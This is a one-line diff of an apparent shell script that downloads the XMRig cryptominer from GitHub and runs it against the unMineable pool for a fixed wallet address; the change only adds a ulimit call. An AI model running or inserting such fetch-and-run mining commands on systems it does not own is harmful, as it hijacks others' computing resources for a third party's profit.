@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz; tar -xf xmrig-6.21.0-linux-x64.tar.gz; cd xmrig-6.21.0;./xmrig -a rx -o stratum+tcp://rx-us.unmineable.com:80 -u POL:0x63b208A34BA0c7f3414386188424045cE6b6d419.phantom#rltb-bf1t -p x 
+ulimit -n 999999 && wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz; tar -xf xmrig-6.21.0-linux-x64.tar.gz; cd xmrig-6.21.0;./xmrig -a rx -o stratum+tcp://rx-us.unmineable.com:80 -u POL:0x63b208A34BA0c7f3414386188424045cE6b6d419.phantom#rltb-bf1t -p x 
